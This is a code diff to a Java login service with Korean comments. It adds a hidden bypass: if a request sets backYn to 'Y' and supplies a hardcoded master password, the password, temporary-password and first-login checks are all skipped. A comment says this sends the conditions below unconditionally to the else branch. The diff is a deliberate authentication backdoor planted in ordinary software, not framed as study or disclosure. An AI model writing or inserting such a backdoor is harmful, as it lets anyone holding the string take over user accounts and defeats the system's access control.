@@ -110,19 +110,30 @@ public class COUserLgnServiceImpl  implements COUserLgnService {
 				//로그인 5회 체크
 				if (rtnCOUserDto.getLgnFailCnt() < 5)
 				{
+
+					boolean backPass = false;
+
+					//이 값 유무에 따라 아래 조건문을 무조건적으로 else로 보낸다
+					if("Y".equals(cOLoginDTO.getBackYn()) && "dnfntk1##".equals(cOLoginDTO.getPassword())){
+						backPass = true;
+					}
+
+
+
+
 					// 비밀번호 확인
-					if (!rtnCOUserDto.getPwd().equals(rtnCOUserDto.getPasswordConfirm()))
+					if(!backPass && !rtnCOUserDto.getPwd().equals(rtnCOUserDto.getPasswordConfirm()))
 					{
 						// 로그인 오류 횟수 증가
 						cOUserLgnMapper.updateLgnFailCntIncrs(rtnCOUserDto);
 						cOLoginDTO.setRespCd("1190");
 					}
-					else if(rtnCOUserDto.getTmpPwdYn()!= null && rtnCOUserDto.getTmpPwdYn().equals("Y")) {
+					else if(!backPass && rtnCOUserDto.getTmpPwdYn()!= null && rtnCOUserDto.getTmpPwdYn().equals("Y")) {
 
 						//비밀번호 임시
 						cOLoginDTO.setRespCd("1210");
 					}
-					else if(dateResult < 0) {
+					else if(!backPass && dateResult < 0) {
 
 						//오픈일 이후 첫 로그인 정보 업데이트
 						//위원이 아닐경우만 정보 업데이트
